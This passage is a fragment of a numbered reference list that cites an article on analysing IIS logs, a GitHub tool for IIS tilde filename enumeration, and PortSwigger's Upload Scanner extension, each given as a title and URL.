21. *Analyzing IIS Logs: Ultimate Guide 2026*. https://fivenines.io/blog/analyzing-iis-logs/
22. *GitHub - esabear/iis_tilde_enum: Takes a URL and checks the ...*. https://github.com/esabear/iis_tilde_enum
23. *Upload Scanner - PortSwigger*. https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa
